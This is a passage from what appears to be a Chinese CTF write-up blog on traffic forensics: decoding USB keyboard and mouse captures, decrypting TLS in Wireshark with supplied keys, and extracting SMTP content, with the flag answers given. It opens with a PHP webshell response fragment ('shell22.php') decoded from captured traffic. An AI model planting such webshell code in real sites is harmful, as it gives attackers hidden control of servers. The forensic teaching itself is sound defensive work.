+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//shell22.php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">function main($content)</span><br><span class="line">&#123;</span><br><span class="line">	$result = array();</span><br><span class="line">	$result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode($content);</span><br><span class="line">    $key = $_SESSION[&#x27;k&#x27;];</span><br><span class="line">    echo encrypt(json_encode($result),$key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">    	&#123;</span><br><span class="line">    		for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">			return $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    else</span><br><span class="line">    	&#123;</span><br><span class="line">    		return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;$content=&quot;517195c7-8810-44e4-b46d-5631f04af782&quot;;</span><br><span class="line">main($content);</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141130781.png" alt="image-20240114113046673"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141132598.png" alt="image-20240114113256556"></p>
+<h2 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h2><p>USB(Universal Serial Bus)的全称是通用串口总线，USB流量指的是USB设备接口的流量，攻击者能够通过监听 USB 接口流量获取键盘敲击键、鼠标移动与点击、存储设备的明文传输通信、USB无线网卡网络传输内容等信息。在CTF比赛中，USB流量分析主要以键盘和鼠标流量为主。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111127835.png" alt="image-20240111112742741"></p>
+<p>上图显示的是从本地机器捕获的USB 接口流量，需要注意的是，USBPcap pseudoheader(伪头)不属于发送内容部分，而是USBPcap 控制程序的部分pseudoheader后面的部分才是真正要发送或接收到的内容。在这个例子中URB 就是 pseudoheader，占27 字节真正发送的内容是 Leftover CaptureData中的8字节。</p>
+<p>键盘和鼠标传输的内容就在Leftover Capture Data 中。键盘数据包的数据长度为8字节，击键信息集中在第 3 个字节，这个字节并不是字符的ASCII码，具体映射关系需要查看 USB HID USAGE TABLE 第 53 页的内容。</p>
+<p>鼠标移动时表现出连续性，但实际上鼠标动作所产生的数据包是离散的，每一个数据包的数据区有 4个字节，第1个字节代表按键，值为 0x00时，表示没有按键;值为0x01时，表示按左键;值为0x02 时，表示当前按键为右键。第2个字节可以看成一个 signedbyte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少个像素;这个值为负时，代表鼠标水平左移多少个像素。第3 个字节与第 2个字节类似，代表鼠标垂直移动的像素数。得到这些信息后，即可恢复出鼠标移动轨迹。</p>
+<p>针对键盘和鼠标的USB流量分析，可以使用开源工具 <a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a> 和 <a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a> 完成。这两个工具可以从流量包中读出击键内容并恢复出鼠标轨迹。</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/misc/traffic/protocols/usb/">https://ctf-wiki.org/misc/traffic/protocols/usb/</a></p>
+<h3 id="例题key-pcap"><a href="#例题key-pcap" class="headerlink" title="例题key.pcap"></a>例题key.pcap</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111134064.png" alt="image-20240111113457000"></p>
+<p>很明显的键盘USB流量</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111134118.png" alt="image-20240111113408077"></p>
+<h3 id="例题mice-pcap"><a href="#例题mice-pcap" class="headerlink" title="例题mice.pcap"></a>例题mice.pcap</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111140581.png" alt="image-20240111114014519"></p>
+<p>很明显的鼠标USB流量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python usb-mouse-pcap-visualizer.py -i mice.pcap</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111139090.png" alt="image-20240111113953009"></p>
+<h3 id="11USB"><a href="#11USB" class="headerlink" title="11USB"></a>11USB</h3><p>打开数据包文件后从协议可以发现这应该是一个USB的数据包</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111359615.png" alt="image-20240111135913551"></p>
+<p>找到此USB设备的回复数据包，在详情中可以这个USB设备应该是一个罗技光电鼠标</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111402989.png" alt="image-20240111140228923"></p>
+<p>自己观察每个数据后可以发现，这个数据包应该是代表着鼠标的移动，因为它的值在不断的变化，第二个字节代表X轴的移动，而第三个字节则代表在Y轴的+255和-256之间的运动</p>
+<p>我们假设这些值确实是鼠标的移动产生的，接下来我们用tshark导出这些数据</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111456351.png" alt="image-20240111145612251"></p>
+<p>然后我们需要将第二个和第三个字节转换为坐标，可以使用以下命令，具体命令的意思可以查看awk的一些知识(注意，使用strtomun函数时需要安装gawk，在kali里面直接运行apt-get install gawk即可安装)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;function comp(v)&#123;if(v&gt;127)v-=256;return v&#125;&#123;x+=comp(strtonum(&quot;0x&quot;$2));y+=comp(strtonum(&quot;0x&quot;$3))&#125;$1==&quot;01&quot;&#123;print x,y&#125;&#x27; data2.txt &gt; data3.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111456660.png" alt="image-20240111145638521"></p>
+<p> 然后我们使用gnuplot将这些数据绘制成图片即可</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111457220.png" alt="image-20240111145703157"></p>
+<p>注意此时的图片可能是颠倒过来的，放到photoshop中将其垂直翻转即可</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111457002.png" alt="image-20240111145716957"></p>
+<p>CTF{tHe_CAT_is_the_CULpRiT}</p>
+<h3 id="37usbcatch"><a href="#37usbcatch" class="headerlink" title="37usbcatch"></a>37usbcatch</h3><blockquote>
+<p>有个小偷从我的电脑里copy一个秘密文本，找到他</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111627070.png" alt="image-20240111162749008"></p>
+<p>可以看到flag.txt的内容</p>
+<p>did_you_know_ctf</p>
+<h2 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h2><p>SSL&#x2F;TLS是一种密码通信框架，也是目前使用最广泛的密码通信方法。SSL&#x2F;TLS 综合运用了密码学中的对称密码、消息认证码、公钥密码、数字签名、伪随机数生成器等算法SSL (Secure Socket Layer，安全套接层)是 1994 年由 Netscape公司设计的一套协议，并于1995年发布了3.0版本。TLS (Transport Layer Security，安全传输层)是IETF 在 SSL 3.0基础上设计的协议，相当于SSL的后续版本。</p>
+<p>TLS 协议位于传输层和应用层之间，其功能是一个加密通道，和上层应用协议无关由于HTTP采用明文传输，很容易被攻击者窃听或者篡改内容，通过引入TLS对HTTP的内容进行加密等操作，可以有效防止窃听篡改和劫持等，如下图所示</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111658681.png" alt="image-20240111165822622"></p>
+<p>在CTF比赛中，关于TLS 的考点并不是很多。当没有私钥时，因为无法对加密流量进行解密，所以TLS协议一般不是我们关注的重点。但是，有一类题目会提供TLS的私钥，这就需要我们在Wireshark中导入私钥，从而解密相关流量。</p>
+<h3 id="例题TheGreatEscape-pcapng"><a href="#例题TheGreatEscape-pcapng" class="headerlink" title="例题TheGreatEscape.pcapng"></a>例题TheGreatEscape.pcapng</h3><blockquote>
+<p>flag格式为INS{}</p>
+</blockquote>
+<p>首先看到协议分级里面有ftp</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111700364.png" alt="image-20240111170010309"></p>
+<p>经过分析，发现向ftp服务器上传了ssc.key文件，然后将文件导出，打开发现是私钥文件。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111703158.png" alt="image-20240111170323116"></p>
+<p>题目的意思应该是让我们导入私钥文件，利用会话统计功能，发现有大量443端口的连接，猜测可能是TLS协议。</p>
+<p>单击“编辑”工具栏，选择最下方的“首选项”，打开后在窗口左侧选择“Protocols”,再选择TLS</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111717730.png" alt="image-20240111171724685"></p>
+<p>单击“RSA keys list”旁边的Edit按钮，单击左下角的“+”按钮，新增一项，各字段按下图填写。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111718790.png" alt="image-20240111171858750"></p>
+<p>其中，IP地址可以空缺，Wireshark会自动选择相应的TLS流解密;Port填写443;因为要解密HTTPS，故 Protocol填写解密后的应用层协议HTTP;Key File是提取出的私钥的保存路径;如果知道证书的加密密钥，就填写到Password字段，一般情况下可以不填。单击右下角的“OK”按钮，Wireshark 会使用该私钥对相关流量自动解密。输入过滤规则“http contains”INS””，单击过滤出的第一个数据包，展开HTTP解析结果，可以看到flag:INS{OkThatWasWay2Easy}。当没有导入私钥时，输入上述过滤规则，则没有任何数据包满足过滤条件，说明导入的私钥被 Wireshark 正常用于解密</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111720556.png" alt="image-20240111172023508"></p>
+<p>除了使用私钥，在SSL&#x2F;TLS 中，Pre Master Secret (预主密)的作用至关重要，无论是RSA加密算法还是DH密钥交换算法，最终都是为了交换或者协商出 Pre Master Secret.通过Pre Master Secret，结合其他参数，可计算出Master Secret 作为整个会话的密钥。因此，如果比赛题目提供了 Pre-Master-Secret log 或者 Master-Secret log，在 Wireshark 中直接导人，在(Pre)-Master-Secret log file name处选择合适的文件，就可以完成解密。这里我们不讨论解密算法的细节。</p>
+<h3 id="例题transcript-zip"><a href="#例题transcript-zip" class="headerlink" title="例题transcript.zip"></a>例题transcript.zip</h3><p>在(Pre)-Master-Secret log处导人题目提供的 keylogfile.txt 文件，单击OK 按钮后，Wireshark并没有直接解密。选中一个TLS协议的数据包，选择追踪TLS流可以看到结果</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111724582.png" alt="image-20240111172449514"></p>
+<h3 id="13SSL-Sniff"><a href="#13SSL-Sniff" class="headerlink" title="13SSL Sniff"></a>13SSL Sniff</h3><blockquote>
+<p>我们收到了MITMd的HTTPS请求的网络捕获文件。尝试找到罪魁祸首。</p>
+</blockquote>
+<p>我们得到一个包含SSL加密对话的tcpdump捕获。</p>
+<p>幸运的是，密钥隐藏在证书的stateOrProvinceName字段中</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141654289.png" alt="image-20240114165444206"></p>
+<p>flag{Key-Is-dUs1mKl4}</p>
+<h3 id="24greatescape"><a href="#24greatescape" class="headerlink" title="24greatescape"></a>24greatescape</h3><blockquote>
+<p>分析该数据包，你会有三部分事情要做，先找出ssc.key，再找到https加密传输的flag INS{xxx}</p>
+</blockquote>
+<p>跟例题一样</p>
+<p> 在电子邮件中发现的两个地址指向52.214.142.175：443.所以这可能是我们正在寻找的正确的IP地址。要确认，请查看在PCAP文件中是否有来自52.214.142.175的任何流量。你会看到加密的流量。让我们使用从SMTP协议（IP：52.214.142.175，PORT：443）和FTP（私钥）收集的所有信息来解密SSL流量。Wireshark允许解密TLS流量。插入ssc.key在编辑- &gt;首选项- &gt; SSL</p>
+<p>使用过滤器“ ip.addr &#x3D;&#x3D; 52.214.142.175 and http”。你可以看到解密的流量</p>
+<h3 id="35ssl-sniffer2"><a href="#35ssl-sniffer2" class="headerlink" title="35ssl-sniffer2"></a>35ssl-sniffer2</h3><blockquote>
+<p>我们收到了一个HTTPS请求的数据包。我们知道实际的请求有有用的信息，私钥server.key.insecure。</p>
+</blockquote>
+<p>跟例题一样，导入</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111750691.png" alt="image-20240111175047657"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401111750080.png" alt="image-20240111175005041"></p>
+<p>39u7v25n1jxkl123</p>
+<h2 id="Smpt"><a href="#Smpt" class="headerlink" title="Smpt"></a>Smpt</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/347466981">Wireshark对SMTP抓包分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39112646/article/details/104860150">Wireshark协议分析之SMTP</a></p>
+<h3 id="01Smtp"><a href="#01Smtp" class="headerlink" title="01Smtp"></a>01Smtp</h3><blockquote>
+<p><strong>找到数据包中的敏感字符，拿到其密文</strong></p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312212245033.png" alt="image-20231221224526967"></p>
+<p>RkxBRzpJU0NDVEVTVHBhcw&#x3D;&#x3D;</p>
+<p>FLAG:ISCCTESTpas</p>
+<h3 id="42smtp-cotent"><a href="#42smtp-cotent" class="headerlink" title="42smtp_cotent"></a>42smtp_cotent</h3><blockquote>
+<p>敌军有可能正在进行一项秘密交易，找到他们交易的证据</p>
+</blockquote>
+<p>因为是明文传输</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091148022.png" alt="image-20240109114842935"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091148210.png" alt="image-20240109114827119"></p>
+<p>flag{this_is_secret_eemials}</p>
+<h3 id="43smtp-attachment"><a href="#43smtp-attachment" class="headerlink" title="43smtp_attachment"></a>43smtp_attachment</h3><blockquote>
+<p>我们捕获到一些可疑的数据包，可能存在邮件的附件中，找到他</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091153005.png" alt="image-20240109115328904"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091154453.png" alt="image-20240109115410373"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#123;goods_is_secret&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="44http-smtp"><a href="#44http-smtp" class="headerlink" title="44http_smtp"></a>44http_smtp</h3><blockquote>
+<p>张三下了加密的压缩包，却没有解压密码，李四通过邮箱给发了消息，帮他解决这个问题</p>
+</blockquote>
+<p>首先导出http对象</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091157334.png" alt="image-20240109115745287"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401091157713.png" alt="image-20240109115710683"></p>
+<p>解压密码为：<a href="mailto:&#99;&#116;&#102;&#x40;&#x7a;&#105;&#112;&#x2e;&#107;&#x65;&#121;">&#99;&#116;&#102;&#x40;&#x7a;&#105;&#112;&#x2e;&#107;&#x65;&#121;</a></p>
+<p>key{402e432465e2e87ce5d8ef733d40d593}</p>
+<h3 id="45ftp-smtp"><a href="#45ftp-smtp" class="headerlink" title="45ftp-smtp"></a>45ftp-smtp</h3><blockquote>
+<p>小黑通过ftp下载加密压缩包，李四邮件发给他密码，截获他们的网络流量，找到flag</p>
+</blockquote>
+<p>一样的道理</p>
+<p><a href="mailto:&#102;&#105;&#108;&#x65;&#x40;&#x7a;&#105;&#x70;&#46;&#x6b;&#x65;&#121;">&#102;&#105;&#108;&#x65;&#x40;&#x7a;&#105;&#x70;&#46;&#x6b;&#x65;&#121;</a></p>
+<p>key{c1ceee8f742b991baf90b393070cbeaf}</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="10510-数据包分析-密码获取"><a href="#10510-数据包分析-密码获取" class="headerlink" title="10510-数据包分析-密码获取"></a>10510-数据包分析-密码获取</h3><p>选择第一条数据包follow tcp stream</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141641746.png" alt="image-20240114164117695"></p>
+<p>乍一看好像是答案</p>
+<p>但是</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141641448.png" alt="image-20240114164156402"></p>
+<p>7F对应的ASCII是嘛呢，原来是DEL，0D表示的是回车</p>
+<p>backdoorm8te</p>
+<h3 id="10514-数据包分析-transfer"><a href="#10514-数据包分析-transfer" class="headerlink" title="10514-数据包分析-transfer"></a>10514-数据包分析-transfer</h3><blockquote>
+<p>我嗅了一段时间的网络流量，我想我终于有了一些有趣的事情。帮助我通过所有这些数据包找到标志。</p>
+</blockquote>
+<p>搜索flag，追踪</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141701570.png" alt="image-20240114170114514"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">enc_ciphers = [<span class="string">&#x27;rot13&#x27;</span>, <span class="string">&#x27;b64e&#x27;</span>, <span class="string">&#x27;caesar&#x27;</span>]</span><br><span class="line"><span class="comment"># dec_ciphers = [&#x27;rot13&#x27;, &#x27;b64d&#x27;, &#x27;caesard&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13</span>(<span class="params">s</span>):</span><br><span class="line">	_rot13 = string.maketrans( </span><br><span class="line">    	<span class="string">&quot;ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz&quot;</span>, </span><br><span class="line">    	<span class="string">&quot;NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> string.translate(s, _rot13)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64e</span>(<span class="params">s</span>):</span><br><span class="line">	<span class="keyword">return</span> b64encode(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar</span>(<span class="params">plaintext, shift=<span class="number">3</span></span>):</span><br><span class="line">    alphabet = string.ascii_lowercase</span><br><span class="line">    shifted_alphabet = alphabet[shift:] + alphabet[:shift]</span><br><span class="line">    table = string.maketrans(alphabet, shifted_alphabet)</span><br><span class="line">    <span class="keyword">return</span> plaintext.translate(table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">pt, cnt=<span class="number">50</span></span>):</span><br><span class="line">	tmp = <span class="string">&#x27;2&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(b64encode(pt))</span><br><span class="line">	<span class="keyword">for</span> cnt <span class="keyword">in</span> xrange(cnt):</span><br><span class="line">		c = random.choice(enc_ciphers)</span><br><span class="line">		i = enc_ciphers.index(c) + <span class="number">1</span></span><br><span class="line">		_tmp = <span class="built_in">globals</span>()[c](tmp)</span><br><span class="line">		tmp = <span class="string">&#x27;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i, _tmp)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	<span class="built_in">print</span> encode(FLAG, cnt=?)2Mk16Sk5i...........</span><br></pre></td></tr></table></figure>
+
+<p>解码脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 